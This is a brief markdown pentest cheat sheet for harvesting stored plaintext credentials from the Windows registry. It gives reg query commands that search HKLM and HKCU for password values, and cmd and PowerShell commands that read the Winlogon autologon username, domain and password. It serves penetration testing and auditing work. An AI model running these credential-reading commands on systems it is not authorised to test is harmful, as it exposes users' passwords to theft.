# Manual

## 01 - Command Prompt

Using a registry to query the plain text password in the key. Note: these two methods may not work so use the **Auditing Tools** instead.

1. **Method 1:** Registry for key names and passwords (This is useless since it prints out more information)

```
C:\> reg query hklm /f "password" /t REG_SZ /s /k

C:\> reg query hkcu /f "password" /t REG_SZ /s /k
```

2. **Method 2:** Windows Autologin (This is a better option to harvest the credentials)

```
C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon"

C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

## 02 - Powershell

`PS C:\> Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | Select-Object "Default*"`

---
## References

- [Pentestlab Blog: Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)